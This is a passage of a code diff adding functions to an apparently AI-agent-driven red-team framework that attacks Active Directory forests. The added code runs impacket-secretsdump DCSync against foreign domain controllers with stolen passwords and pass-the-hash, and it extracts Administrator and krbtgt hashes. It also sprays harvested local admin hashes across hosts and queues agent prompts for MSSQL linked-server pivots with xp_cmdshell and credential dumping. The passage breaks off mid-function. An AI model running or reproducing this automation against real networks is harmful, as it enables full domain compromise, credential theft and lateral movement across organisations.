+                                        f"🌲 Trust SID extraction via LDAP failed: "
+                                        f"{sid_extract_err}"
                                     )
 
                                 # Dispatch trust extraction for
@@ -4541,14 +5072,14 @@ async def _auto_golden_ticket(
                         # Multi-forest mode: dispatch trust extraction after EVERY
                         # successful golden ticket, not just from the ExtraSid path.
                         # This ensures trust extraction fires for forest root domains
-                        # (e.g., sevenkingdoms.local) where ExtraSid doesn't apply,
+                        # (e.g., contoso.local) where ExtraSid doesn't apply,
                         # and serves as a safety net if the ExtraSid path's dispatch
                         # was skipped due to an exception in Step 1/2 processing.
                         if get_multi_forest_mode() and not state.all_forests_dominated():
                             _undom = state.get_undominated_forests()
                             if _undom:
                                 # For child domains, dispatch from parent (forest root)
-                                # since trust accounts (e.g., ESSOS$) live there
+                                # since trust accounts (e.g., FABRIKAM$) live there
                                 _dispatch_domain = domain
                                 _dparts = domain.lower().split(".")
                                 if len(_dparts) >= 3 and parent_domain:
@@ -4599,6 +5130,926 @@ async def _auto_golden_ticket(
             break
         except Exception as e:
             logger.error(f"Auto golden ticket error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_foreign_dcsync(
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 45.0,
+) -> None:
+    """
+    Background task that auto-dispatches secretsdump against foreign (undominated) domains
+    when credentials for those domains are available.
+
+    This handles the case where:
+    - Trust key extraction is dispatched but fails (e.g., inter-realm Kerberos broken)
+    - But we have plaintext credentials for the foreign domain (e.g., password reuse,
+      admin.user injected, or discovered via MSSQL links)
+
+    When a credential for an undominated foreign domain exists AND we know the DC IP,
+    this task runs secretsdump to extract krbtgt and Administrator hashes, achieving DA.
+    """
+    import re
+
+    from ares.core.models import Hash
+
+    logger.info("🌲 Auto-foreign-dcsync: background task started")
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            if state.completed:
+                logger.info("🌲 Auto-foreign-dcsync: operation complete, stopping")
+                break
+
+            # Only relevant in multi-forest mode
+            if not get_multi_forest_mode():
+                logger.debug("🌲 Auto-foreign-dcsync: not in multi-forest mode, skipping")
+                continue
+
+            # Sync hosts/domains from Redis (picks up CLI inject-host data)
+            await state.sync_hosts_and_domains_from_redis()
+
+            # Sync domain_controllers and credentials from Redis
+            has_tq = bool(dispatcher._task_queue)
+            has_redis = bool(getattr(dispatcher._task_queue, "redis", None)) if has_tq else False
+            if not has_tq or not has_redis:
+                logger.warning(
+                    f"🌲 Auto-foreign-dcsync: Redis not available "
+                    f"(task_queue={has_tq}, redis={has_redis})"
+                )
+            if dispatcher._task_queue and dispatcher._task_queue.redis:
+                try:
+                    redis_client = dispatcher._task_queue.redis
+                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
+                    redis_dcs = await redis_client.hgetall(dc_key)
+                    if redis_dcs:
+                        for dc_domain, dc_ip_val in redis_dcs.items():
+                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
+                            ip = dc_ip_val if isinstance(dc_ip_val, str) else dc_ip_val.decode()
+                            if d.lower() not in state.domain_controllers:
+                                state.domain_controllers[d.lower()] = ip
+
+                    from ares.core.state_backend import RedisStateBackend
+
+                    backend = RedisStateBackend(redis_client, state.operation_id)
+                    redis_creds = await backend.get_credentials()
+                    for c in redis_creds:
+                        existing_cred = next(
+                            (
+                                ex
+                                for ex in state.all_credentials
+                                if ex.username.lower() == c.username.lower()
+                                and ex.domain.lower() == (c.domain or "").lower()
+                            ),
+                            None,
+                        )
+                        if existing_cred is None:
+                            state.all_credentials.append(c)
+                        elif c.is_admin and not existing_cred.is_admin:
+                            # Update is_admin from Redis (e.g. inject --is-admin)
+                            existing_cred.is_admin = True
+                            logger.info(
+                                f"🌲 Auto-foreign-dcsync: updated is_admin=True for "
+                                f"{existing_cred.username}@{existing_cred.domain}"
+                            )
+
+                    # Sync hosts from Redis — critical for foreign domain discovery
+                    # Hosts injected via CLI or discovered by agents may not be in
+                    # in-memory state yet; add_host() also updates all_domains
+                    redis_hosts = await backend.get_hosts()
+                    for h in redis_hosts:
+                        if not any(existing.ip == h.ip for existing in state.all_hosts):
+                            state.add_host(h)
+                            logger.info(
+                                f"🌲 Auto-foreign-dcsync: synced host from Redis: "
+                                f"{h.ip} ({h.hostname})"
+                            )
+                except Exception as sync_err:
+                    logger.warning(f"🌲 Auto-foreign-dcsync: Redis sync error: {sync_err}")
+
+            undominated = state.get_undominated_forests()
+            if not undominated:
+                # Don't break — foreign domains may be discovered later
+                # (e.g., MSSQL links, trust enum, host injection)
+                continue
+
+            logger.info(
+                f"🌲 Auto-foreign-dcsync: undominated={undominated}, "
+                f"dcs={dict(state.domain_controllers)}, "
+                f"creds_count={len(state.all_credentials)}"
+            )
+
+            # Look for credentials belonging to undominated foreign domains
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+
+                # Find DC IP for this foreign domain
+                dc_ip = state.domain_controllers.get(fd_lower)
+                if not dc_ip:
+                    # Try to find from hosts
+                    for host in state.all_hosts:
+                        if host.is_dc and host.hostname:
+                            h_domain = ".".join(host.hostname.lower().split(".")[1:])
+                            if h_domain == fd_lower and host.ip:
+                                dc_ip = host.ip
+                                break
+                if not dc_ip:
+                    logger.info(f"🌲 Auto-foreign-dcsync: no DC IP for {foreign_domain}, skipping")
+                    continue
+
+                # Find credentials for this domain (plaintext or hash)
+                for cred in state.all_credentials:
+                    if not cred.domain or cred.domain.lower() != fd_lower:
+                        continue
+                    if not cred.password:
+                        continue
+                    if not _is_valid_secret_candidate(cred.password):
+                        logger.debug(
+                            f"🌲 Auto-foreign-dcsync: skipping invalid secret artifact for "
+                            f"{cred.username}@{cred.domain}"
+                        )
+                        continue
+                    if not _can_attempt_foreign_dcsync(state, cred.username, cred.domain):
+                        logger.debug(
+                            f"🌲 Auto-foreign-dcsync: skipping non-admin foreign credential "
+                            f"{cred.username}@{cred.domain}"
+                        )
+                        continue
+
+                    dedup_key = f"{fd_lower}:{dc_ip}:{cred.username.lower()}"
+                    if dedup_key in state.processed_foreign_dcsync:
+                        continue
+
+                    logger.info(
+                        f"🌲 Auto-foreign-dcsync: attempting secretsdump on "
+                        f"{foreign_domain} DC {dc_ip} with "
+                        f"{cred.username}@{cred.domain}"
+                    )
+
+                    # Full DCSync (no -just-dc-user to get everything)
+                    cmd = [
+                        "impacket-secretsdump",
+                        f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                        "-just-dc",
+                    ]
+                    stdout, stderr, _rc = await _async_run_tool(cmd, timeout_seconds=300)
+                    output = (stdout or "") + "\n" + (stderr or "")
+
+                    if not output.strip():
+                        logger.warning(
+                            f"🌲 Auto-foreign-dcsync: empty output from secretsdump on {dc_ip}"
+                        )
+                        continue
+
+                    # Parse Administrator hash
+                    admin_match = re.search(
+                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                        output,
+                    )
+                    if admin_match:
+                        logger.success(
+                            f"🌲 Auto-foreign-dcsync: got Administrator hash for {foreign_domain}!"
+                        )
+                        state.add_hash(
+                            Hash(
+                                username="Administrator",
+                                domain=foreign_domain,
+                                hash_type="NTLM",
+                                hash_value=admin_match.group(1),
+                                source=f"auto_foreign_dcsync:{cred.username}@{cred.domain}",
+                            ),
+                            "auto_foreign_dcsync",
+                        )
+                        # Mark DA on this foreign domain
+                        state.has_domain_admin = True
+                        if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
+                            state.domain_admin_domains.append(fd_lower)
+                            logger.success(f"🌲🏆 DOMAIN ADMIN on foreign forest {foreign_domain}!")
+
+                    # Parse krbtgt hash + AES
+                    krbtgt_match = re.search(
+                        r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                        output,
+                    )
+                    krbtgt_aes = re.search(
+                        r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
+                        output,
+                    )
+                    if krbtgt_match:
+                        aes_val = krbtgt_aes.group(1) if krbtgt_aes else ""
+                        logger.success(
+                            f"🌲 Auto-foreign-dcsync: got krbtgt for "
+                            f"{foreign_domain} (AES: {'yes' if aes_val else 'no'})"
+                        )
+                        state.add_hash(
+                            Hash(
+                                username="krbtgt",
+                                domain=foreign_domain,
+                                hash_type="NTLM",
+                                hash_value=krbtgt_match.group(1),
+                                aes_key=aes_val,
+                                source=f"auto_foreign_dcsync:{cred.username}@{cred.domain}",
+                            ),
+                            "auto_foreign_dcsync",
+                        )
+
+                    # Always dedup after attempt (success or fail)
+                    state.processed_foreign_dcsync.add(dedup_key)
+
+                    if admin_match or krbtgt_match:
+                        await dispatcher._checkpoint()
+
+                        # Check if all forests now dominated
+                        if state.all_forests_dominated():
+                            logger.success("🌲🏆 ALL FORESTS DOMINATED via auto-foreign-dcsync!")
+                            state.completed = True
+                            await dispatcher._checkpoint()
+                            return
+
+                        # Got a result, don't try other creds for this domain
+                        break
+
+                # Also try hash-based auth for foreign domain.
+                # Include hashes that either:
+                # 1. Have domain matching the foreign domain (direct match)
+                # 2. Are local Administrator hashes from foreign-domain hosts
+                #    (local admin password reuse: sql01 → web01)
+                foreign_host_ips = set()
+                for host in state.all_hosts:
+                    if host.hostname and "." in host.hostname:
+                        h_domain = host.hostname.lower().split(".", 1)[-1]
+                        if h_domain == fd_lower:
+                            foreign_host_ips.add(host.ip)
+
+                for hash_obj in state.all_hashes:
+                    if hash_obj.username.lower() == "krbtgt":
+                        continue  # krbtgt can't authenticate
+                    if hash_obj.username.endswith("$"):
+                        continue  # machine accounts can't PTH across forests
+                    if (hash_obj.hash_type or "").upper() != "NTLM":
+                        continue
+                    if not _is_valid_secret_candidate(hash_obj.hash_value):
+                        logger.debug(
+                            f"🌲 Auto-foreign-dcsync: skipping invalid hash artifact for "
+                            f"{hash_obj.username}@{hash_obj.domain}"
+                        )
+                        continue
+
+                    # Check if this hash is relevant to the foreign domain
+                    hash_domain = (hash_obj.domain or "").lower()
+                    is_foreign_domain_hash = hash_domain == fd_lower
+
+                    # Also check for local admin hashes from foreign domain hosts
+                    # (secretsdump on sql01 yields Administrator with empty/NetBIOS domain)
+                    is_local_admin_from_foreign = False
+                    if hash_obj.username.lower() == "administrator" and hash_obj.source:
+                        for fip in foreign_host_ips:
+                            if fip in hash_obj.source:
+                                is_local_admin_from_foreign = True
+                                break
+
+                    if not is_foreign_domain_hash and not is_local_admin_from_foreign:
+                        continue
+
+                    # For foreign domain hashes, check admin eligibility
+                    # For local admin from foreign hosts, always try (password reuse)
+                    if (
+                        is_foreign_domain_hash
+                        and not is_local_admin_from_foreign
+                        and not _can_attempt_foreign_dcsync(
+                            state, hash_obj.username, hash_obj.domain
+                        )
+                    ):
+                        logger.debug(
+                            f"🌲 Auto-foreign-dcsync: skipping non-admin foreign hash "
+                            f"{hash_obj.username}@{hash_obj.domain}"
+                        )
+                        continue
+
+                    dedup_key = f"{fd_lower}:{dc_ip}:{hash_obj.username.lower()}:pth"
+                    if dedup_key in state.processed_foreign_dcsync:
+                        continue
+
+                    # Use the foreign domain for auth (not the hash's domain which
+                    # may be empty or NetBIOS for local admin hashes from member servers)
+                    auth_domain = hash_obj.domain if is_foreign_domain_hash else foreign_domain
+
+                    logger.info(
+                        f"🌲 Auto-foreign-dcsync: attempting PTH secretsdump on "
+                        f"{foreign_domain} DC {dc_ip} with "
+                        f"{hash_obj.username}@{auth_domain} (hash, "
+                        f"{'local admin reuse' if is_local_admin_from_foreign else 'domain hash'})"
+                    )
+
+                    cmd = [
+                        "impacket-secretsdump",
+                        f"{auth_domain}/{hash_obj.username}@{dc_ip}",
+                        "-hashes",
+                        f"aad3b435b51404eeaad3b435b51404ee:{hash_obj.hash_value}",
+                        "-just-dc",
+                    ]
+                    stdout, stderr, _rc = await _async_run_tool(cmd, timeout_seconds=300)
+                    output = (stdout or "") + "\n" + (stderr or "")
+
+                    admin_match = re.search(
+                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                        output,
+                    )
+                    if admin_match:
+                        logger.success(
+                            f"🌲 Auto-foreign-dcsync (PTH): got Administrator "
+                            f"hash for {foreign_domain}!"
+                        )
+                        state.add_hash(
+                            Hash(
+                                username="Administrator",
+                                domain=foreign_domain,
+                                hash_type="NTLM",
+                                hash_value=admin_match.group(1),
+                                source=f"auto_foreign_dcsync:pth:{hash_obj.username}@{hash_obj.domain}",
+                            ),
+                            "auto_foreign_dcsync",
+                        )
+                        state.has_domain_admin = True
+                        if fd_lower not in [d.lower() for d in state.domain_admin_domains]:
+                            state.domain_admin_domains.append(fd_lower)
+                            logger.success(
+                                f"🌲🏆 DOMAIN ADMIN on foreign forest {foreign_domain} (via PTH)!"
+                            )
+
+                    krbtgt_match = re.search(
+                        r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+                        output,
+                    )
+                    krbtgt_aes = re.search(
+                        r"krbtgt:aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)",
+                        output,
+                    )
+                    if krbtgt_match:
+                        aes_val = krbtgt_aes.group(1) if krbtgt_aes else ""
+                        state.add_hash(
+                            Hash(
+                                username="krbtgt",
+                                domain=foreign_domain,
+                                hash_type="NTLM",
+                                hash_value=krbtgt_match.group(1),
+                                aes_key=aes_val,
+                                source=f"auto_foreign_dcsync:pth:{hash_obj.username}@{hash_obj.domain}",
+                            ),
+                            "auto_foreign_dcsync",
+                        )
+
+                    # Always dedup after attempt (success or fail)
+                    state.processed_foreign_dcsync.add(dedup_key)
+                    if admin_match or krbtgt_match:
+                        await dispatcher._checkpoint()
+                        if state.all_forests_dominated():
+                            logger.success(
+                                "🌲🏆 ALL FORESTS DOMINATED via auto-foreign-dcsync (PTH)!"
+                            )
+                            state.completed = True
+                            await dispatcher._checkpoint()
+                            return
+                        break
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto foreign DCSync error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_cross_forest_pivot(
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 60.0,
+) -> None:
+    """
+    Background task that dispatches cross-forest attack paths when trust key DCSync fails.
+
+    After DA is achieved on the primary domain and undominated forests remain, this task:
+    1. Dispatches FSP enumeration to discover cross-forest group memberships
+    2. Re-scans MSSQL hosts with cross-forest context for linked server pivoting
+    3. Dispatches RBCD/LAPS attacks based on FSP discoveries
+
+    This provides fallback paths when inter-realm ticket DCSync is blocked by
+    SPN target name validation on modern patched DCs.
+    """
+    logger.info("🌲 Auto-cross-forest-pivot: background task started")
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            if state.completed:
+                logger.info("🌲 Auto-cross-forest-pivot: operation complete, stopping")
+                break
+
+            # Only relevant in multi-forest mode with DA and undominated forests
+            if not get_multi_forest_mode():
+                continue
+            if not state.has_domain_admin:
+                continue
+
+            # Sync hosts/domains from Redis (picks up CLI inject-host data)
+            synced = await state.sync_hosts_and_domains_from_redis()
+            if synced:
+                logger.info(f"🌲 Auto-cross-forest-pivot: synced {synced} new items from Redis")
+
+            foreign = state._get_foreign_domains()
+            undominated = state.get_undominated_forests()
+            if not undominated:
+                if foreign:
+                    # All known foreign forests are dominated — we're done
+                    logger.info("🌲 Auto-cross-forest-pivot: all forests dominated, stopping")
+                    break
+                # No foreign domains discovered yet — keep waiting
+                continue
+
+            logger.info(
+                f"🌲 Auto-cross-forest-pivot: cycle — "
+                f"undominated={undominated}, "
+                f"vulns={len(state.discovered_vulnerabilities)}, "
+                f"exploited={len(state.exploited_vulnerabilities)}"
+            )
+
+            # Sync state from Redis (same pattern as _auto_foreign_dcsync)
+            if dispatcher._task_queue and getattr(dispatcher._task_queue, "redis", None):
+                try:
+                    redis_client = dispatcher._task_queue.redis
+                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
+                    redis_dcs = await redis_client.hgetall(dc_key)
+                    if redis_dcs:
+                        for dc_domain, dc_ip_val in redis_dcs.items():
+                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
+                            ip = dc_ip_val if isinstance(dc_ip_val, str) else dc_ip_val.decode()
+                            if d.lower() not in state.domain_controllers:
+                                state.domain_controllers[d.lower()] = ip
+
+                    from ares.core.state_backend import RedisStateBackend
+
+                    backend = RedisStateBackend(redis_client, state.operation_id)
+                    redis_creds = await backend.get_credentials()
+                    for c in redis_creds:
+                        existing_cred = next(
+                            (
+                                ex
+                                for ex in state.all_credentials
+                                if ex.username.lower() == c.username.lower()
+                                and ex.domain.lower() == (c.domain or "").lower()
+                            ),
+                            None,
+                        )
+                        if existing_cred is None:
+                            state.all_credentials.append(c)
+                        elif c.is_admin and not existing_cred.is_admin:
+                            existing_cred.is_admin = True
+
+                    redis_hosts = await backend.get_hosts()
+                    for h in redis_hosts:
+                        if not any(existing.ip == h.ip for existing in state.all_hosts):
+                            state.add_host(h)
+                except Exception as sync_err:
+                    logger.warning(f"🌲 Auto-cross-forest-pivot: Redis sync error: {sync_err}")
+
+            # ── Phase A: FSP Enumeration Dispatch ──
+            # For each undominated forest with a known DC, dispatch FSP enumeration
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+                dc_ip = state.domain_controllers.get(fd_lower)
+                if not dc_ip:
+                    # Try to find from hosts
+                    for host in state.all_hosts:
+                        if host.is_dc and host.hostname:
+                            h_domain = ".".join(host.hostname.lower().split(".")[1:])
+                            if h_domain == fd_lower and host.ip:
+                                dc_ip = host.ip
+                                break
+                if not dc_ip:
+                    continue
+
+                # Find a credential we can use — prefer cross-domain or DA creds
+                fsp_cred = None
+                # First: try credentials for the foreign domain itself
+                for cred in state.all_credentials:
+                    if cred.domain and cred.domain.lower() == fd_lower and cred.password:
+                        fsp_cred = cred
+                        break
+                # Second: try DA credentials from dominated domains (may work via trust)
+                if not fsp_cred:
+                    da_domains = {d.lower() for d in state.domain_admin_domains}
+                    for cred in state.all_credentials:
+                        if (
+                            cred.domain
+                            and cred.domain.lower() in da_domains
+                            and cred.password
+                            and cred.is_admin
+                        ):
+                            fsp_cred = cred
+                            break
+
+                if not fsp_cred:
+                    continue
+
+                dedup_key = f"{fd_lower}:{dc_ip}:{fsp_cred.username.lower()}"
+                if state.is_processed("processed_fsp_enumerations", dedup_key):
+                    continue
+
+                state.mark_processed("processed_fsp_enumerations", dedup_key)
+
+                logger.info(
+                    f"🌲 Auto-cross-forest-pivot: dispatching FSP enumeration on "
+                    f"{foreign_domain} DC {dc_ip} with {fsp_cred.username}@{fsp_cred.domain}"
+                )
+
+                # Find source domain (the dominated domain) for SID resolution
+                source_domain = ""
+                for da_domain in state.domain_admin_domains:
+                    if da_domain.lower() != fd_lower:
+                        source_domain = da_domain
+                        break
+
+                # Dispatch as a recon task
+                await dispatcher._throttled_submit_task(
+                    task_type="recon",
+                    target_role="recon",
+                    payload={
+                        "tool": "enumerate_foreign_security_principals",
+                        "domain": foreign_domain,
+                        "target_ips": [dc_ip],
+                        "target_domain": foreign_domain,
+                        "username": fsp_cred.username,
+                        "password": fsp_cred.password,
+                        "dc_ip": dc_ip,
+                        "source_domain": source_domain,
+                    },
+                    source_agent="auto_cross_forest_pivot",
+                    priority=2,
+                )
+
+            # ── Phase B: Cross-Forest MSSQL Re-scan ──
+            # Force re-queue MSSQL vulns with fresh credentials and cross-forest context.
+            # Runs every cycle (not just once) because new creds keep arriving
+            # (e.g., DA achieved → secretsdump → many more creds than initial queue).
+            try:
+                queued = await dispatcher.scan_hosts_for_mssql(force_requeue=True)
+                if queued > 0:
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: re-queued {queued} MSSQL "
+                        f"vulnerability(ies) with fresh credentials + cross-forest context"
+                    )
+            except Exception as mssql_err:
+                logger.warning(f"🌲 Auto-cross-forest-pivot: MSSQL re-scan error: {mssql_err}")
+
+            # ── Phase B1.5: MSSQL Linked Server Cross-Forest Dispatch ──
+            # When MSSQL hosts in dominated domains have linked servers to foreign
+            # domains, dispatch explicit cross-forest MSSQL exploitation tasks.
+            # This handles the sql02→sql01 linked server chain:
+            # 1. Agent exploits sql02 MSSQL (dominated domain)
+            # 2. Discovers SQL01 linked server pointing to foreign domain
+            # 3. We dispatch a new task specifically for the linked server pivot
+            #
+            # Also dispatches targeted MSSQL tasks on foreign-domain MSSQL hosts
+            # using ALL available credentials (not just the stale ones from initial queue).
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+
+                # Find MSSQL hosts in foreign domain
+                foreign_mssql_hosts = []
+                for host in state.all_hosts:
+                    if not host.hostname or "." not in host.hostname:
+                        continue
+                    host_domain = host.hostname.lower().split(".", 1)[-1]
+                    if host_domain != fd_lower:
+                        continue
+                    services_lower = [s.lower() for s in host.services]
+                    if any(
+                        ind in svc for svc in services_lower for ind in ("mssql", "1433", "ms-sql")
+                    ):
+                        foreign_mssql_hosts.append(host)
+
+                # Find MSSQL hosts in dominated domains that could have linked servers
+                # to foreign domain (these are the pivot points)
+                da_domains = {d.lower() for d in state.domain_admin_domains}
+                for host in state.all_hosts:
+                    if not host.hostname or "." not in host.hostname:
+                        continue
+                    host_domain = host.hostname.lower().split(".", 1)[-1]
+                    if host_domain not in da_domains:
+                        continue
+                    services_lower = [s.lower() for s in host.services]
+                    has_mssql = any(
+                        ind in svc for svc in services_lower for ind in ("mssql", "1433", "ms-sql")
+                    )
+                    if not has_mssql:
+                        continue
+
+                    # Dispatch linked server pivot task for this dominated-domain MSSQL host
+                    pivot_key = f"mssql_linked_pivot:{host.ip}:{fd_lower}"
+                    if state.is_processed("processed_cross_forest_pivots", pivot_key):
+                        continue
+
+                    sql_creds = dispatcher._find_sql_credentials()
+                    if not sql_creds:
+                        continue
+
+                    state.mark_processed("processed_cross_forest_pivots", pivot_key)
+
+                    # Build foreign host targets for the prompt
+                    foreign_targets = [f"{fh.hostname} ({fh.ip})" for fh in foreign_mssql_hosts]
+
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: dispatching MSSQL linked server "
+                        f"pivot from {host.hostname} ({host.ip}) targeting {fd_lower} "
+                        f"with {len(sql_creds)} credentials"
+                    )
+
+                    # Queue as a high-priority exploit — the linked server is the path
+                    pivot_details: dict[str, Any] = {
+                        "hostname": host.hostname,
+                        "services": host.services,
+                        "available_credentials": sql_creds,
+                        "note": (
+                            f"CRITICAL CROSS-FOREST PIVOT: This MSSQL server in {host_domain} "
+                            f"likely has linked servers to {foreign_domain}. "
+                            f"Known foreign MSSQL hosts: {', '.join(foreign_targets) if foreign_targets else 'unknown — enumerate them'}. "
+                            f"ATTACK CHAIN: "
+                            f"1) Connect with each credential below (Windows auth). "
+                            f"2) mssql_enum_impersonation — check EXECUTE AS rights to sa/other users. "
+                            f"3) If impersonation found: mssql_impersonate to escalate to sysadmin. "
+                            f"4) mssql_enum_linked_servers — find cross-forest linked servers. "
+                            f"5) mssql_linked_enable_xpcmdshell on the foreign linked server. "
+                            f"6) mssql_linked_xpcmdshell — execute 'whoami', 'ipconfig', 'net user /domain' on foreign host. "
+                            f"7) Extract credentials: run secretsdump or dump SAM from the foreign host. "
+                            f"TRY ALL CREDENTIALS — one of them is sysadmin or can impersonate sa."
+                        ),
+                    }
+
+                    await dispatcher.queue_vulnerability(
+                        vuln_type="mssql_cross_forest_pivot",
+                        target=host.ip,
+                        details=pivot_details,
+                        discovered_by="auto_cross_forest_pivot",
+                    )
+
+                # Also dispatch direct MSSQL exploitation on foreign-domain MSSQL hosts
+                # using cross-domain Windows auth (trust allows this)
+                for fhost in foreign_mssql_hosts:
+                    direct_key = f"mssql_foreign_direct:{fhost.ip}:{fd_lower}"
+                    if state.is_processed("processed_cross_forest_pivots", direct_key):
+                        continue
+
+                    sql_creds = dispatcher._find_sql_credentials()
+                    if not sql_creds:
+                        continue
+
+                    state.mark_processed("processed_cross_forest_pivots", direct_key)
+
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: dispatching direct MSSQL exploitation on "
+                        f"foreign host {fhost.hostname} ({fhost.ip}) with {len(sql_creds)} credentials"
+                    )
+
+                    direct_details: dict[str, Any] = {
+                        "hostname": fhost.hostname,
+                        "services": fhost.services,
+                        "available_credentials": sql_creds,
+                        "note": (
+                            f"CROSS-FOREST MSSQL TARGET in {foreign_domain}. "
+                            f"Forest trust allows Windows auth from dominated domains. "
+                            f"Try ALL credentials below — some may authenticate via trust. "
+                            f"Check impersonation rights, linked servers back to dominated domain, "
+                            f"and enable xp_cmdshell for RCE. "
+                            f"Any command execution here = foothold in {foreign_domain}."
+                        ),
+                    }
+
+                    await dispatcher.queue_vulnerability(
+                        vuln_type="mssql_cross_forest_pivot",
+                        target=fhost.ip,
+                        details=direct_details,
+                        discovered_by="auto_cross_forest_pivot",
+                    )
+
+            # ── Phase B2: Auto-secretsdump on exploited MSSQL foreign hosts ──
+            # When MSSQL linked server / impersonation succeeds on a foreign host,
+            # the agent gets sa access but may not follow through to secretsdump.
+            # Dispatch secretsdump explicitly to extract local admin hashes.
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+                for vuln in list(state.discovered_vulnerabilities.values()):
+                    if not vuln.vuln_type.startswith("mssql_"):
+                        continue
+                    if vuln.vuln_id not in state.exploited_vulnerabilities:
+                        continue
+                    # Check if this MSSQL vuln targets a host in the foreign domain
+                    target_host = None
+                    for host in state.all_hosts:
+                        if host.ip == vuln.target and host.hostname:
+                            host_domain = (
+                                host.hostname.lower().split(".", 1)[-1]
+                                if "." in host.hostname
+                                else ""
+                            )
+                            if host_domain == fd_lower:
+                                target_host = host
+                                break
+                    if not target_host:
+                        continue
+
+                    sd_key = f"mssql_secretsdump:{fd_lower}:{vuln.target}"
+                    if state.is_processed("processed_cross_forest_pivots", sd_key):
+                        continue
+                    state.mark_processed("processed_cross_forest_pivots", sd_key)
+
+                    # Find best credential for secretsdump (prefer creds from this domain)
+                    sd_cred = None
+                    for cred in state.all_credentials:
+                        if cred.password and cred.domain and cred.domain.lower() == fd_lower:
+                            sd_cred = cred
+                            break
+                    # Fall back to any credential with a password
+                    if not sd_cred:
+                        for cred in state.all_credentials:
+                            if cred.password:
+                                sd_cred = cred
+                                break
+                    if not sd_cred:
+                        continue
+
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: dispatching secretsdump on "
+                        f"{target_host.hostname} ({vuln.target}) after MSSQL exploit "
+                        f"with {sd_cred.username}@{sd_cred.domain}"
+                    )
+                    # Submit directly to task queue — bypass throttle for cross-forest
+                    # critical path. The throttle's deferred queue can drop these tasks
+                    # when at capacity, silently killing the cross-forest pipeline.
+                    dc_ip = state.domain_controllers.get(fd_lower)
+                    parent_id, parent_step = dispatcher._find_credential_id(
+                        sd_cred.username, sd_cred.domain, sd_cred.password
+                    )
+                    sd_payload: dict[str, Any] = {
+                        "domain": foreign_domain,
+                        "target_ips": [vuln.target],
+                        "dc_ip": dc_ip,
+                        "username": sd_cred.username,
+                        "password": sd_cred.password,
+                        "reason": "mssql_exploit_secretsdump",
+                        "techniques": ["secretsdump"],
+                        "parent_credential_id": parent_id,
+                        "parent_attack_step": parent_step,
+                    }
+                    if dispatcher._task_queue:
+                        sd_task_id = await dispatcher._task_queue.submit_task(
+                            task_type="credential_access",
+                            target_role="credential_access",
+                            payload=sd_payload,
+                            source_agent="auto_cross_forest_pivot",
+                            priority=2,
+                        )
+                        logger.info(
+                            f"🌲 Auto-cross-forest-pivot: secretsdump task {sd_task_id} "
+                            f"submitted directly (bypassed throttle)"
+                        )
+
+            # ── Phase B3: Spray foreign host hashes against foreign DC ──
+            # When secretsdump on sql01 yields local admin hashes, try them
+            # against other hosts in the foreign domain (especially the DC).
+            # Local admin passwords are often reused across member servers and DCs.
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+                dc_ip = state.domain_controllers.get(fd_lower)
+                if not dc_ip:
+                    continue
+
+                # Find all IPs and NetBIOS hostnames belonging to this foreign domain
+                foreign_ips = set()
+                foreign_netbios = set()
+                for host in state.all_hosts:
+                    if host.hostname and "." in host.hostname:
+                        host_domain = host.hostname.lower().split(".", 1)[-1]
+                        if host_domain == fd_lower:
+                            foreign_ips.add(host.ip)
+                            # Extract NetBIOS name (first component of FQDN)
+                            foreign_netbios.add(host.hostname.lower().split(".")[0])
+
+                for hash_obj in state.all_hashes:
+                    if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
+                        continue
+                    # Skip machine accounts (end with $) — they can't PTH across forests
+                    if hash_obj.username.endswith("$"):
+                        continue
+                    # Skip krbtgt — can't authenticate
+                    if hash_obj.username.lower() == "krbtgt":
+                        continue
+                    # Only interested in hashes from foreign domain hosts
+                    # (local admin hashes have empty domain or NetBIOS hostname as domain)
+                    hash_source_ip = ""
+                    if hash_obj.source:
+                        for fip in foreign_ips:
+                            if fip in hash_obj.source:
+                                hash_source_ip = fip
+                                break
+                    # Also check if hash domain matches foreign domain FQDN or NetBIOS hostname
+                    # secretsdump output uses NetBIOS prefix (e.g., SQL01\Administrator)
+                    # so hash domain may be a hostname, not the FQDN domain
+                    hash_domain = (hash_obj.domain or "").lower()
+                    is_foreign_hash = (
+                        hash_source_ip or hash_domain == fd_lower or hash_domain in foreign_netbios
+                    )
+
+                    if not is_foreign_hash:
+                        continue
+
+                    pth_key = f"pth_foreign:{fd_lower}:{hash_obj.username.lower()}:{hash_obj.hash_value[:16]}"
+                    if state.is_processed("processed_cross_forest_pivots", pth_key):
+                        continue
+                    state.mark_processed("processed_cross_forest_pivots", pth_key)
+
+                    # Try this hash against all foreign domain hosts we haven't hit
+                    target_ips = [ip for ip in foreign_ips if ip != hash_source_ip]
+                    if dc_ip not in target_ips:
+                        target_ips.insert(0, dc_ip)  # DC first — highest value
